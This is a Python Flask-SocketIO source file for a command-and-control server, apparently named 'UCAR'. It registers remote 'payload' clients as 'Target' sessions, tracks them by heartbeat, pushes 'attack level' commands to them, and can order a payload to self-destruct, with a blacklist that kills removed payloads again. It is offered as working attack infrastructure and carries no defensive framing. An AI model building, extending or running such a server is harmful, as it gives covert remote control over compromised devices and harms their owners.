# UCAR System: Command & Control Server
# Author: Sigma

# --- CRITICAL FIX: Monkey Patching ---
import eventlet
eventlet.monkey_patch()

from flask import Flask
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

# --- Data Store ---
sessions = {}
# Blacklist to prevent deleted payloads from reappearing
blacklist = set()

@app.route('/')
def health_check():
    return "UCAR C2 Server is Operational", 200

def check_offline_sessions():
    while True:
        socketio.sleep(10)
        now = time.time()
        changed = False
        for sid, data in sessions.items():
            if data['status'] == 'online' and now - data['last_seen'] > 30:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed:
            socketio.emit('session_list_update', sessions, namespace='/dashboard')

socketio.start_background_task(check_offline_sessions)

# --- Dashboard Namespace ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    emit('session_list_update', sessions)

@socketio.on('update_attack_level', namespace='/dashboard')
def handle_attack(data):
    sid = data.get('session_id')
    level = data.get('level')
    if sid in sessions:
        sessions[sid]['attack_level'] = level
        socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('delete_session', namespace='/dashboard')
def delete_session(data):
    """Hard delete: Triggers self-destruct and blacklists the ID."""
    sid = data.get('session_id')
    
    # 1. Add to blacklist immediately
    blacklist.add(sid)
    
    # 2. Send Self-Destruct Command
    print(f"Issuing KILL command to {sid}")
    socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
    
    # 3. Remove from active sessions
    if sid in sessions:
        del sessions[sid]
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

# --- Payload Namespace ---

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    sid = data.get('session_id')
    if not sid: return
    
    # Check Blacklist
    if sid in blacklist:
        # If a blacklisted payload tries to connect, kill it again.
        join_room(sid)
        emit('command_self_destruct', {}, namespace='/payload', room=sid)
        return

    join_room(sid)
    
    if sid not in sessions:
        sessions[sid] = {
            'nametag': f'Target-{sid[:4]}', 
            'status': 'online', 
            'last_seen': time.time(), 
            'attack_level': 0
        }
    else:
        sessions[sid]['status'] = 'online'
        sessions[sid]['last_seen'] = time.time()
        
    socketio.emit('session_list_update', sessions, namespace='/dashboard')
    
    # Sync attack state (in case of reconnect)
    current_level = sessions[sid]['attack_level']
    emit('command_update_attack', {'level': current_level}, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['last_seen'] = time.time()
    elif sid in blacklist:
        # Kill heartbeat from blacklisted device
        emit('command_self_destruct', {}, namespace='/payload', room=sid)

if __name__ == '__main__':
    socketio.run(app)
